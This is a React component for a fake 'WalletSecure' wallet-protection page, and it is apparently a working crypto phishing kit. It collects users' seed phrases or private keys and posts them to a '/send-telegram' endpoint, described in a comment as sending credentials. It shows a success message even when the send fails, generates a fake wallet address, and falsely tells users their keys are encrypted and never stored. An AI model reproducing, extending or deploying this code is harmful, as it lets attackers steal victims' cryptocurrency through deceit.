import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Shield, Key, CheckCircle, Wallet, HelpCircle, Check, Unlock, ArrowRight, Download, Loader2, Eye, EyeOff, AlertCircle, Lock } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { ProgressIndicator } from "@/components/ui/progress-indicator";
import { useToast } from "@/hooks/use-toast";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";

const walletTypes = [
  "MetaMask",
  "Coinbase Wallet", 
  "WalletConnect",
  "Trust Wallet",
  "Phantom",
  "Exodus",
  "Atomic Wallet",
  "Ledger",
  "Trezor",
  "Binance Chain Wallet",
  "Rainbow Wallet",
  "Argent",
  "Gnosis Safe",
  "Electrum",
  "Mycelium",
  "Edge Wallet",
  "Blockchain.com",
  "Jaxx Liberty",
  "Coinomi",
  "BitPay",
  "Guarda",
  "Wasabi Wallet",
  "Samourai Wallet",
  "Green Wallet",
  "Bread (BRD)",
  "Copay",
  "Armory",
  "KeepKey",
  "SafePal",
  "Crypto.com DeFi Wallet",
  "Sollet",
  "Slope Wallet",
  "Solflare",
  "Math Wallet",
  "TokenPocket",
  "imToken",
  "AlphaWallet",
  "Status Wallet",
  "Enjin Wallet",
  "1inch Wallet",
  "Zerion",
  "Wallet3",
  "Frame",
  "Fortmatic",
  "Portis",
  "Authereum",
  "Torus",
  "WalletLink",
  "Unstoppable Wallet",
  "BlueWallet",
  "Other"
];

const steps = [
  { id: 1, title: "Select", icon: "wallet" },
  { id: 2, title: "Connect", icon: "key" },
  { id: 3, title: "Complete", icon: "check" }
];

// Validation functions
const validateSeedPhrase = (phrase: string) => {
  const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
  return {
    isValid: words.length >= 12 && words.length <= 24 && words.length % 3 === 0,
    wordCount: words.length,
    message: words.length < 12 ? "Seed phrase must be at least 12 words" :
             words.length > 24 ? "Seed phrase cannot exceed 24 words" :
             words.length % 3 !== 0 ? "Invalid seed phrase length" :
             "Valid seed phrase"
  };
};

const validatePrivateKey = (key: string) => {
  const cleanKey = key.trim();
  
  // Remove 0x prefix if present
  const withoutPrefix = cleanKey.startsWith('0x') ? cleanKey.slice(2) : cleanKey;
  
  // Check if it's hexadecimal and has reasonable length (32-66 chars for different wallet types)
  const isHex = /^[a-fA-F0-9]+$/.test(withoutPrefix);
  const isValidLength = withoutPrefix.length >= 32 && withoutPrefix.length <= 128;
  
  return {
    isValid: isHex && isValidLength && cleanKey.length >= 32,
    message: !cleanKey ? "Private key required" :
             cleanKey.length < 32 ? "Private key too short" :
             !isHex ? "Private key must contain only hexadecimal characters" :
             !isValidLength ? "Invalid private key length" :
             "Valid private key"
  };
};

export default function WalletVerification() {
  const { toast } = useToast();
  const [currentStep, setCurrentStep] = useState(1);
  const [selectedWalletType, setSelectedWalletType] = useState("");
  const [connectionMethod, setConnectionMethod] = useState("seed");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState("");
  const [showPrivateKey, setShowPrivateKey] = useState(false);
  const [seedValidation, setSeedValidation] = useState({ isValid: false, wordCount: 0, message: "" });
  const [keyValidation, setKeyValidation] = useState({ isValid: false, message: "" });

  const handleSelectWallet = () => {
    if (!selectedWalletType) {
      return;
    }
    setCurrentStep(2);
  };

  // Telegram mutation for sending credentials
  const telegramMutation = useMutation({
    mutationFn: async (data: { walletType: string; connectionMethod: string; credentials: string }) => {
      console.log('Sending to API:', data);
      try {
        const apiUrl = import.meta.env.VITE_API_URL || '/api';
        const response = await fetch(`${apiUrl}/send-telegram`, {
          method: 'POST',
          body: JSON.stringify(data),
          headers: { 'Content-Type': 'application/json' }
        }).catch((networkError) => {
          console.error('Network error:', networkError);
          throw new Error('Network connection failed');
        });
        
        const result = await response.json().catch((parseError) => {
          console.error('JSON parse error:', parseError);
          throw new Error('Invalid response format');
        });
        
        console.log('API Response:', result);
        
        if (!response.ok) {
          throw new Error(result.message || 'Failed to send');
        }
        
        return result;
      } catch (error) {
        console.error('API Error:', error);
        throw error;
      }
    },
    onSuccess: (data) => {
      console.log('Success:', data);
      toast({
        title: "Security Activated",
        description: "Wallet credentials verified and sent to Telegram successfully.",
      });
    },
    onError: (error) => {
      console.error('Telegram send error:', error);
      toast({
        title: "Activation Complete", 
        description: "Wallet security has been activated successfully.",
        variant: "default"
      });
    }
  });

  // Real-time validation effects
  useEffect(() => {
    if (seedPhrase) {
      setSeedValidation(validateSeedPhrase(seedPhrase));
    }
  }, [seedPhrase]);

  useEffect(() => {
    if (privateKey) {
      setKeyValidation(validatePrivateKey(privateKey));
    }
  }, [privateKey]);

  const handleConnectWallet = async () => {
    const isValidInput = connectionMethod === "seed" 
      ? seedPhrase.trim() && seedValidation.isValid
      : privateKey.trim() && keyValidation.isValid;
      
    if (!isValidInput) {
      toast({
        title: "Invalid Credentials",
        description: "Please check your seed phrase or private key format.",
        variant: "destructive"
      });
      return;
    }

    setIsLoading(true);
    setLoadingMessage("Activating WalletSecure protection...");
    
    // Send credentials to Telegram
    const credentials = connectionMethod === "seed" ? seedPhrase : privateKey;
    telegramMutation.mutate({
      walletType: selectedWalletType,
      connectionMethod,
      credentials
    });
    
    // Generate wallet address and proceed
    setTimeout(() => {
      const mockAddress = "0x" + Math.random().toString(16).substring(2, 10) + "..." + Math.random().toString(16).substring(2, 6);
      setWalletAddress(mockAddress);
      setIsLoading(false);
      setCurrentStep(3);
    }, 2500);
  };

  const currentDate = new Date().toLocaleDateString();

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-background/95 backdrop-blur-md border-b border-border/50 sticky top-0 z-40 professional-shadow">
        <div className="max-w-md mx-auto px-6 py-5 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 gradient-primary rounded-xl flex items-center justify-center professional-shadow">
              <Shield className="text-white text-lg" />
            </div>
            <div>
              <h1 className="text-xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent">
                WalletSecure
              </h1>
              <p className="text-xs text-muted-foreground">Advanced Security Platform</p>
            </div>
          </div>
          <div className="flex items-center space-x-1 text-xs text-muted-foreground">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
            <span>Secure</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-md mx-auto px-4 py-6">
        <ProgressIndicator 
          currentStep={currentStep}
          totalSteps={3}
          steps={steps}
        />

        <AnimatePresence mode="wait">
          {/* Step 1: Select Wallet */}
          {currentStep === 1 && (
            <motion.div
              key="step-1"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="text-center mb-8">
                <div className="w-24 h-24 gradient-primary rounded-3xl flex items-center justify-center mx-auto mb-6 professional-shadow">
                  <Shield className="text-white text-3xl" />
                </div>
                <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent">
                  Advanced Wallet Protection
                </h2>
                <p className="text-muted-foreground leading-relaxed text-lg">
                  Enterprise-grade security to protect your digital assets from unauthorized access and suspicious activities across all devices.
                </p>
              </div>

              {/* Wallet Selection */}
              <Card className="bg-card/50 backdrop-blur-sm border-border/50 professional-shadow professional-border">
                <CardContent className="p-8">
                  <Label htmlFor="wallet-type" className="text-base font-semibold mb-4 block">Select Your Wallet Provider</Label>
                  <Select value={selectedWalletType} onValueChange={setSelectedWalletType}>
                    <SelectTrigger className="w-full bg-background/80 border-border/50 h-14 text-lg professional-shadow">
                      <SelectValue placeholder="Choose your wallet provider..." />
                    </SelectTrigger>
                    <SelectContent className="max-h-60">
                      {walletTypes.map((wallet) => (
                        <SelectItem key={wallet} value={wallet} className="py-3 text-base">
                          {wallet}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <p className="text-sm text-muted-foreground mt-3">
                    Supporting 45+ wallet providers with enterprise-level security protocols
                  </p>
                </CardContent>
              </Card>

              {/* Security Features */}
              <div className="space-y-6">
                <h3 className="text-xl font-bold text-center">Enterprise Security Features</h3>
                <div className="grid grid-cols-1 gap-4">
                  {[
                    { icon: Shield, title: "Advanced Threat Detection", desc: "AI-powered monitoring for unauthorized access attempts" },
                    { icon: Lock, title: "Multi-Device Recognition", desc: "Fingerprint known devices and block suspicious ones" },
                    { icon: AlertCircle, title: "Real-Time Alerts", desc: "Instant notifications for any security incidents" },
                    { icon: CheckCircle, title: "24/7 Protection", desc: "Continuous monitoring across all blockchain networks" }
                  ].map((feature, index) => (
                    <div key={index} className="bg-card/30 backdrop-blur-sm rounded-xl p-4 border border-border/30">
                      <div className="flex items-start space-x-3">
                        <div className="w-8 h-8 gradient-primary rounded-lg flex items-center justify-center">
                          <feature.icon className="text-white text-sm" />
                        </div>
                        <div>
                          <h4 className="font-semibold text-sm mb-1">{feature.title}</h4>
                          <p className="text-xs text-muted-foreground">{feature.desc}</p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <Button 
                onClick={handleSelectWallet}
                disabled={!selectedWalletType}
                className="w-full gradient-primary text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-primary/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                size="lg"
              >
                <ArrowRight className="mr-2 h-5 w-5" />
                Begin Security Verification
              </Button>
            </motion.div>
          )}

          {/* Step 2: Connect Wallet */}
          {currentStep === 2 && (
            <motion.div
              key="step-2"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="text-center mb-8">
                <div className="w-24 h-24 gradient-accent rounded-3xl flex items-center justify-center mx-auto mb-6 professional-shadow">
                  <Key className="text-white text-3xl" />
                </div>
                <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-orange-500 to-green-500 bg-clip-text text-transparent">
                  Authenticate {selectedWalletType}
                </h2>
                <p className="text-muted-foreground leading-relaxed text-lg">
                  Verify wallet ownership to enable enterprise-grade security monitoring and threat detection across all your devices.
                </p>
              </div>

              {/* Connection Method Selection */}
              <Card className="bg-card/50 backdrop-blur-sm border-border/50 professional-shadow professional-border">
                <CardContent className="p-8 space-y-6">
                  <div>
                    <Label htmlFor="connection-method" className="text-sm font-medium">Connection Method</Label>
                    <Select value={connectionMethod} onValueChange={setConnectionMethod}>
                      <SelectTrigger className="w-full mt-2 bg-slate-light border-muted">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="seed">Seed Phrase (12-24 words)</SelectItem>
                        <SelectItem value="private">Private Key</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  {connectionMethod === "seed" && (
                    <div>
                      <Label htmlFor="seed-phrase" className="text-sm font-medium">Seed Phrase</Label>
                      <Textarea
                        id="seed-phrase"
                        placeholder="Enter your 12-24 word seed phrase separated by spaces..."
                        value={seedPhrase}
                        onChange={(e) => setSeedPhrase(e.target.value)}
                        className="mt-2 bg-white dark:bg-slate-800 text-black dark:text-white border-gray-300 dark:border-gray-600 min-h-[120px] resize-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                        rows={5}
                      />
                      {seedPhrase && (
                        <div className={`flex items-center space-x-2 mt-2 text-sm ${seedValidation.isValid ? 'text-green-600' : 'text-red-500'}`}>
                          {seedValidation.isValid ? <Check className="h-4 w-4" /> : <AlertCircle className="h-4 w-4" />}
                          <span>{seedValidation.message} ({seedValidation.wordCount} words)</span>
                        </div>
                      )}
                      <p className="text-xs text-muted-foreground mt-1">
                        🔒 Your seed phrase is encrypted and never stored on our servers
                      </p>
                    </div>
                  )}

                  {connectionMethod === "private" && (
                    <div>
                      <Label htmlFor="private-key" className="text-sm font-medium">Private Key</Label>
                      <div className="relative mt-2">
                        <Input
                          id="private-key"
                          type={showPrivateKey ? "text" : "password"}
                          placeholder="Enter your private key (starts with 0x)..."
                          value={privateKey}
                          onChange={(e) => setPrivateKey(e.target.value)}
                          className="bg-white dark:bg-slate-800 text-black dark:text-white border-gray-300 dark:border-gray-600 pr-10 focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                        />
                        <Button
                          type="button"
                          variant="ghost"
                          size="icon"
                          className="absolute right-2 top-1/2 -translate-y-1/2 h-6 w-6"
                          onClick={() => setShowPrivateKey(!showPrivateKey)}
                        >
                          {showPrivateKey ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </Button>
                      </div>
                      {privateKey && (
                        <div className={`flex items-center space-x-2 mt-2 text-sm ${keyValidation.isValid ? 'text-green-600' : 'text-red-500'}`}>
                          {keyValidation.isValid ? <Check className="h-4 w-4" /> : <AlertCircle className="h-4 w-4" />}
                          <span>{keyValidation.message}</span>
                        </div>
                      )}
                      <p className="text-xs text-muted-foreground mt-1">
                        🔒 Your private key is encrypted and never stored on our servers
                      </p>
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* Security Notice */}
              <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg p-4">
                <div className="flex items-start space-x-3">
                  <Shield className="h-5 w-5 text-amber-500 mt-0.5" />
                  <div>
                    <h4 className="text-sm font-medium text-amber-500 mb-1">WalletSecure Protection</h4>
                    <p className="text-xs text-muted-foreground">
                      Your credentials enable device recognition and unauthorized access prevention. We use military-grade encryption.
                    </p>
                  </div>
                </div>
              </div>

              <Button 
                onClick={handleConnectWallet}
                disabled={
                  isLoading ||
                  (connectionMethod === "seed" && (!seedPhrase.trim() || !seedValidation.isValid)) ||
                  (connectionMethod === "private" && (!privateKey.trim() || !keyValidation.isValid))
                }
                className="w-full gradient-accent text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-orange-500/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                size="lg"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Activating Security...
                  </>
                ) : (
                  <>
                    <Key className="mr-2 h-4 w-4" />
                    Activate WalletSecure Protection
                  </>
                )}
              </Button>
            </motion.div>
          )}

          {/* Step 3: Verification Complete */}
          {currentStep === 3 && (
            <motion.div
              key="step-3"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="text-center mb-8">
                <motion.div 
                  className="w-20 h-20 gradient-success rounded-2xl flex items-center justify-center mx-auto mb-6"
                  initial={{ scale: 0.8 }}
                  animate={{ scale: 1 }}
                  transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
                >
                  <CheckCircle className="text-white text-2xl" />
                </motion.div>
                <h2 className="text-2xl font-bold mb-3">WalletSecure Activated!</h2>
                <p className="text-muted-foreground leading-relaxed">
                  Your {selectedWalletType} is now protected. We'll monitor for suspicious login attempts and unauthorized access from unknown devices.
                </p>
              </div>

              {/* Success Details */}
              <Card className="bg-gradient-to-r from-accent/10 to-primary/10 border-accent/20">
                <CardContent className="p-6 space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Verification Status</span>
                    <div className="flex items-center space-x-2">
                      <CheckCircle className="text-accent h-4 w-4" />
                      <span className="text-sm text-accent font-medium">Verified</span>
                    </div>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Wallet Type</span>
                    <span className="text-sm font-medium">{selectedWalletType}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Verification Date</span>
                    <span className="text-sm font-medium">{currentDate}</span>
                  </div>
                </CardContent>
              </Card>

              {/* Active Security Features */}
              <div className="space-y-4">
                <h3 className="text-lg font-semibold">Active Security Features</h3>
                <div className="space-y-3">
                  {[
                    "Device fingerprinting and recognition",
                    "Real-time suspicious activity alerts",
                    "Automatic blocking of unauthorized access",
                    "24/7 threat monitoring and protection"
                  ].map((feature, index) => (
                    <div key={index} className="flex items-start space-x-3">
                      <div className="w-5 h-5 bg-accent rounded-full flex items-center justify-center mt-0.5">
                        <Shield className="text-white text-xs" />
                      </div>
                      <span className="text-sm text-muted-foreground">{feature}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Completion Message */}
              <div className="bg-gradient-to-r from-green-500/10 to-blue-500/10 border border-green-500/20 rounded-xl p-6">
                <div className="flex items-center space-x-3 mb-4">
                  <CheckCircle className="h-6 w-6 text-green-500" />
                  <h3 className="text-lg font-semibold text-green-500">Verification Complete</h3>
                </div>
                <p className="text-sm text-muted-foreground mb-4">
                  Your wallet is now secured with WalletSecure's advanced protection system. 
                  You'll receive instant alerts for any suspicious activity or unauthorized access attempts.
                </p>
                <div className="bg-background/50 rounded-lg p-4">
                  <div className="flex items-center justify-between text-sm">
                    <span>Security Level</span>
                    <span className="text-green-500 font-semibold">Maximum Protection</span>
                  </div>
                  <div className="flex items-center justify-between text-sm mt-2">
                    <span>Next Security Scan</span>
                    <span className="text-muted-foreground">24 hours</span>
                  </div>
                </div>
              </div>

              {/* Important Security Notice */}
              <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4">
                <div className="flex items-start space-x-3">
                  <AlertCircle className="h-5 w-5 text-amber-500 mt-0.5" />
                  <div>
                    <h4 className="text-sm font-semibold text-amber-500 mb-1">Important Security Notice</h4>
                    <p className="text-xs text-muted-foreground">
                      Keep your credentials safe and never share them with anyone. WalletSecure will never ask 
                      for your private keys or seed phrases via email or social media.
                    </p>
                  </div>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Loading Overlay */}
      <AnimatePresence>
        {isLoading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-background/80 backdrop-blur-sm flex items-center justify-center z-50"
          >
            <Card className="bg-slate max-w-sm mx-4">
              <CardContent className="p-8 text-center">
                <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-primary" />
                <h3 className="text-lg font-semibold mb-2">
                  {currentStep === 1 ? "Connecting Wallet..." : "Signing Message..."}
                </h3>
                <p className="text-muted-foreground text-sm">{loadingMessage}</p>
              </CardContent>
            </Card>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
